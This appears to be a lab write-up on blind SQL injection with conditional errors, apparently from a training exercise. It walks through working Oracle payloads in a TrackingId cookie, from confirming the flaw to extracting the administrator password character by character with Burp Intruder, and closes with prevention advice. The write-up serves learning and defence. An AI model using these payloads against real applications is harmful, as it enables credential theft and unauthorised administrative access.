# Blind SQL Injection with Conditional Errors

## Objective

Exploit a blind SQL injection vulnerability in the `TrackingId` cookie by triggering database errors conditionally, recover the administrator password, and log in as the administrator user.

## Vulnerable Parameter

`TrackingId` cookie

## Step 1: Confirm SQL Injection Exists

Payload:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'
```

Result:
- Application returned an error.

Payload:

```http
Cookie: TrackingId=pkMF7IrpspadrWej''
```

Result:
- No error returned.

Conclusion:
- The application is vulnerable to SQL injection.

## Step 2: Confirm Database Type and Query Structure

Payload:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT '')||'
```

Result:
- Error returned.

Payload:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT '' FROM dual)||'
```

Result:
- No error returned.

Conclusion:
- The `dual` table exists, indicating an Oracle database.

Payload:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT '' FROM not-a-real-table)||'
```

Result:
- Error returned.

Conclusion:
- Confirmed that table existence affects query behavior.

## Step 3: Test Conditional Error-Based Injection

Payload:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Result:
- Error returned.

Payload:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Result:
- No error returned.

Conclusion:
- The query can trigger an error only when a condition evaluates to true.

## Step 4: Confirm Administrator User Exists

Payload:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Result:
- Error returned.

Conclusion:
- Confirmed that the administrator user exists.

## Step 5: Determine Password Length

Payload:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Result:
- Error returned.

Repeated the test with increasing values:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Result:
- No error returned.

Conclusion:
- The administrator password length is **20 characters**.

## Step 6: Extract Password Characters Using Burp Intruder

Payload:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Configuration:

- Attack type: `Sniper`
- Payloads:
  - `a-z`
  - `0-9`

Result analysis:

- HTTP `500` → condition true
- HTTP `200` → condition false

The payload that generated status code `500` was the correct character.

For the second character:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

For the third character:

```http
Cookie: TrackingId=pkMF7IrpspadrWej'||(SELECT CASE WHEN SUBSTR(password,3,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Repeated the process until all 20 characters were recovered.

## Step 7: Log In as Administrator

Used the recovered administrator password and successfully logged in to solve the lab.

## Explanation

Unlike conditional-response blind SQL injection, this application does not change behavior when a query returns rows.

Instead, the application reveals information through errors.

The attack intentionally triggers a database error using:

```sql
TO_CHAR(1/0)
```

Since division by zero generates an error, it becomes possible to determine whether a condition is true or false based on the application's response.

## Security Impact

An attacker could:

- Extract sensitive information without visible query results
- Recover credentials
- Enumerate database contents
- Gain administrative access

## Prevention

- Use parameterized queries (prepared statements)
- Avoid constructing SQL queries through string concatenation
- Validate and sanitize user input
- Restrict database permissions
- Perform regular security testing

## Key Concepts Learned

- Blind SQL injection
- Error-based SQL injection
- Oracle database behavior
- Conditional error generation
- Password enumeration
- Burp Intruder automation
- Authentication compromise
